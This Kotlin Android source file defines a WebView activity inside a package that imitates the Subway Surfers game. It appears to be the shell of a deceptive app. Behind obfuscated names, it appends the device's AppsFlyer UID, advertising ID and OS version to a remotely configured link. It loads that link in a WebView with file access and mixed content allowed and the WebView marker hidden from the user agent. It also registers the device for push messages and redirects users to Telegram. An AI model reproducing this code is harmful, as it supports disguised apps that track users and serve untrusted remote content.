package com.kiloo.subwaysurfr

import android.app.Activity
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.*
import android.provider.MediaStore
import android.webkit.*
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import com.appsflyer.AppsFlyerLib
import com.google.android.material.snackbar.Snackbar
import com.kiloo.subwaysurfr.GooodClass.Companion.C1ftgtgttg
import com.kiloo.subwaysurfr.GooodClass.Companion.DEEPLfrfrrf
import com.kiloo.subwaysurfr.GooodClass.Companion.MAIN_IDdrfrrf
import com.kiloo.subwaysurfr.GooodClass.Companion.linkfrfrrf
import com.kiloo.subwaysurfr.databinding.ActivityVeeeebVievBinding
import com.onesignal.OneSignal
import com.orhanobut.hawk.Hawk
import org.json.JSONException
import org.json.JSONObject
import java.io.File
import java.io.IOException

class VeeeebVievActivity : AppCompatActivity() {
    private val frfr = 1

    var ji: ValueCallback<Array<Uri>>? = null
    var gthy: String? = null
    lateinit var jikiik: WebView
    lateinit var hhyyyhyhy: ActivityVeeeebVievBinding

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        hhyyyhyhy = ActivityVeeeebVievBinding.inflate(layoutInflater)
        setContentView(hhyyyhyhy.root)

        jikiik = hhyyyhyhy.viewWedfrgftgt
        Snackbar.make(
            hhyyyhyhy.root, "Loading...",
            Snackbar.LENGTH_LONG
        ).show()


        val frfrffrrf = CookieManager.getInstance()
        frfrffrrf.setAcceptCookie(true)
        frfrffrrf.setAcceptThirdPartyCookies(jikiik, true)
        kuojkoouk()
        val tgtgtgt: Activity = this
        jikiik.webViewClient = object : WebViewClient() {


            override fun shouldOverrideUrlLoading(view: WebView, url: String): Boolean {
                try {
                    if (URLUtil.isNetworkUrl(url)) {
                        return false
                    }
                    if (poopopopo(url)) {

                        val intent = Intent(Intent.ACTION_VIEW)
                        intent.data = Uri.parse(url)
                        startActivity(intent)
                    } else {

                        Toast.makeText(
                            applicationContext,
                            "Application is not installed",
                            Toast.LENGTH_LONG
                        ).show()
                        startActivity(
                            Intent(
                                Intent.ACTION_VIEW,
                                Uri.parse("https://play.google.com/store/apps/details?id=org.telegram.messenger")
                            )
                        )
                    }
                    return true
                } catch (e: Exception) {
                    return false
                }
                view.loadUrl(url)
            }


            override fun onPageFinished(view: WebView, url: String) {
                super.onPageFinished(view, url)
                lkpikliliklilpk(url)
            }

            override fun onReceivedError(
                view: WebView,
                errorCode: Int,
                description: String,
                failingUrl: String
            ) {
                Toast.makeText(tgtgtgt, description, Toast.LENGTH_SHORT).show()
            }


        }
        jikiik.webChromeClient = object : WebChromeClient() {
            override fun onShowFileChooser(
                webView: WebView, filePathCallback: ValueCallback<Array<Uri>>,
                fileChooserParams: FileChooserParams
            ): Boolean {
                ji?.onReceiveValue(null)
                ji = filePathCallback
                var frgttakePictureIntent: Intent? = Intent(MediaStore.ACTION_IMAGE_CAPTURE)
                if (frgttakePictureIntent!!.resolveActivity(packageManager) != null) {

                    var photoFiledefrfr: File? = null
                    try {
                        photoFiledefrfr = createImageFileeeedfrr()
                        frgttakePictureIntent.putExtra("PhotoPath", gthy)
                    } catch (ex: IOException) {
                    }

                    if (photoFiledefrfr != null) {
                        gthy = "file:" + photoFiledefrfr.absolutePath
                        frgttakePictureIntent.putExtra(
                            MediaStore.EXTRA_OUTPUT,
                            Uri.fromFile(photoFiledefrfr)
                        )
                    } else {
                        frgttakePictureIntent = null
                    }
                }
                val contentSelectionIntentfrgfrft = Intent(Intent.ACTION_GET_CONTENT)
                contentSelectionIntentfrgfrft.addCategory(Intent.CATEGORY_OPENABLE)
                contentSelectionIntentfrgfrft.type = "image/*"
                val intentArrayfrgt: Array<Intent?> =
                    frgttakePictureIntent?.let { arrayOf(it) } ?: arrayOfNulls(0)
                val chooserIntentfrfrrf = Intent(Intent.ACTION_CHOOSER)
                chooserIntentfrfrrf.putExtra(Intent.EXTRA_INTENT, contentSelectionIntentfrgfrft)
                chooserIntentfrfrrf.putExtra(Intent.EXTRA_TITLE, getString(R.string.image_pic_choose))
                chooserIntentfrfrrf.putExtra(Intent.EXTRA_INITIAL_INTENTS, intentArrayfrgt)
                startActivityForResult(
                    chooserIntentfrfrrf, frfr
                )
                return true
            }

            @Throws(IOException::class)
            private fun createImageFileeeedfrr(): File {
                var imageStorageDir = File(
                    Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES),
                    "DirectoryNameHere"
                )
                if (!imageStorageDir.exists()) {
                    imageStorageDir.mkdirs()
                }

                imageStorageDir =
                    File(imageStorageDir.toString() + File.separator + "IMG_" + System.currentTimeMillis() + ".jpg")
                return imageStorageDir
            }

        }

        jikiik.loadUrl(gthyyyh())
    }


    private fun pushToOneSignalgttggt(string: String) {
        OneSignal.setExternalUserId(
            string,
            object : OneSignal.OSExternalUserIdUpdateCompletionHandler {
                override fun onSuccess(results: JSONObject) {
                    try {
                        if (results.has("push") && results.getJSONObject("push").has("success")) {
                            val frrrfrfrfr = results.getJSONObject("push").getBoolean("success")
                            OneSignal.onesignalLog(
                                OneSignal.LOG_LEVEL.VERBOSE,
                                "Set external user id for push status: $frrrfrfrfr"
                            )
                        }
                    } catch (e: JSONException) {
                        e.printStackTrace()
                    }
                    try {
                        if (results.has("email") && results.getJSONObject("email").has("success")) {
                            val deefrgtyhuj =
                                results.getJSONObject("email").getBoolean("success")
                            OneSignal.onesignalLog(
                                OneSignal.LOG_LEVEL.VERBOSE,
                                "Set external user id for email status: $deefrgtyhuj"
                            )
                        }
                    } catch (e: JSONException) {
                        e.printStackTrace()
                    }
                    try {
                        if (results.has("sms") && results.getJSONObject("sms").has("success")) {
                            val isSmsSuccessfrtgt = results.getJSONObject("sms").getBoolean("success")
                            OneSignal.onesignalLog(
                                OneSignal.LOG_LEVEL.VERBOSE,
                                "Set external user id for sms status: $isSmsSuccessfrtgt"
                            )
                        }
                    } catch (e: JSONException) {
                        e.printStackTrace()
                    }
                }

                override fun onFailure(error: OneSignal.ExternalIdError) {
                    OneSignal.onesignalLog(
                        OneSignal.LOG_LEVEL.VERBOSE,
                        "Set external user id done with error: $error"
                    )
                }
            })
    }

    private fun kuojkoouk() {
        val joukjkuo = jikiik.settings
        joukjkuo.javaScriptEnabled = true

        joukjkuo.useWideViewPort = true

        joukjkuo.loadWithOverviewMode = true
        joukjkuo.allowFileAccess = true
        joukjkuo.domStorageEnabled = true
        joukjkuo.userAgentString = joukjkuo.userAgentString.replace("; wv", "")

        joukjkuo.javaScriptCanOpenWindowsAutomatically = true
        joukjkuo.setSupportMultipleWindows(false)

        joukjkuo.displayZoomControls = false
        joukjkuo.builtInZoomControls = true
        joukjkuo.setSupportZoom(true)

        joukjkuo.pluginState = WebSettings.PluginState.ON
        joukjkuo.mixedContentMode = WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
        joukjkuo.setAppCacheEnabled(true)

        joukjkuo.allowContentAccess = true
    }

    private fun gthyyyh(): String {

        val tggyhyhyhy = getSharedPreferences("SP_WEBVIEW_PREFS", AppCompatActivity.MODE_PRIVATE)

        val gthyyhy = "com.kiloo.subwaysurfr"

        val kli:String? = Hawk.get(C1ftgtgttg, "null")
        val koko: String? = Hawk.get(MAIN_IDdrfrrf, "null")
        val kokok: String? = Hawk.get(DEEPLfrfrrf, "null")

        val afafafa = AppsFlyerLib.getInstance().getAppsFlyerUID(this)


        AppsFlyerLib.getInstance().setCollectAndroidID(true)



        val frfrfr = "deviceID="
        val sub4frfrfr = "sub_id_4="
        val sub5fr = "sub_id_5="
        val sub6frrf = "sub_id_6="
        val subOnefrfr = "sub_id_1="
        val adidfrrf = "ad_id="




        val namingggggg = "naming"
        val ftgt = "deeporg"


        val kiokjjlikjhmkij = Build.VERSION.RELEASE

        val linkAB = Hawk.get(linkfrfrrf, "null")

        var laaaaaank = ""
        if (kli != "null"){
            laaaaaank = "$linkAB$subOnefrfr$kli&$frfrfr$afafafa&$adidfrrf$koko&$sub4frfrfr$gthyyhy&$sub5fr$kiokjjlikjhmkij&$sub6frrf$namingggggg"
            pushToOneSignalgttggt(afafafa.toString())
        } else {
            laaaaaank = "$linkAB$subOnefrfr$kokok&$frfrfr$afafafa&$adidfrrf$koko&$sub4frfrfr$gthyyhy&$sub5fr$kiokjjlikjhmkij&$sub6frrf$ftgt"
            pushToOneSignalgttggt(afafafa.toString())
        }

        return tggyhyhyhy.getString("SAVED_URL", laaaaaank).toString()
    }


    private fun poopopopo(uri: String): Boolean {

        val hykhkyk = packageManager
        try {

            hykhkyk.getPackageInfo("org.telegram.messenger", PackageManager.GET_ACTIVITIES)


            return true
        } catch (e: PackageManager.NameNotFoundException) {

        }
        return false
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        if (requestCode != frfr || ji == null) {
            super.onActivityResult(requestCode, resultCode, data)
            return
        }
        var results: Array<Uri>? = null

        if (resultCode == AppCompatActivity.RESULT_OK) {
            if (data == null || data.data == null) {
                results = arrayOf(Uri.parse(gthy))
            } else {
                val ddtdtdtd = data.dataString
                if (ddtdtdtd != null) {
                    results = arrayOf(Uri.parse(ddtdtdtd))
                }
            }
        }
        ji?.onReceiveValue(results)
        ji = null
    }


    private var gtigjtj = false


    var huyhkyhyk = ""
    fun lkpikliliklilpk(lurlurlurlurlur: String?) {
        if (!lurlurlurlurlur!!.contains("t.me")) {

            if (huyhkyhyk == "") {
                huyhkyhyk = getSharedPreferences(
                    "SP_WEBVIEW_PREFS",
                    AppCompatActivity.MODE_PRIVATE
                ).getString(
                    "SAVED_URL",
                    lurlurlurlurlur
                ).toString()

                val rfrrfrfr = getSharedPreferences("SP_WEBVIEW_PREFS", AppCompatActivity.MODE_PRIVATE)
                val yhyhyhhyhy = rfrrfrfr.edit()
                yhyhyhhyhy.putString("SAVED_URL", lurlurlurlurlur)
                yhyhyhhyhy.apply()
            }
        }
    }

    override fun onBackPressed() {


        if (jikiik.canGoBack()) {
            if (gtigjtj) {
                jikiik.stopLoading()
                jikiik.loadUrl(huyhkyhyk)
            }
            this.gtigjtj = true
            jikiik.goBack()
            Handler(Looper.getMainLooper()).postDelayed(Runnable {
                gtigjtj = false
            }, 2000)

        } else {
            super.onBackPressed()
        }
    }
}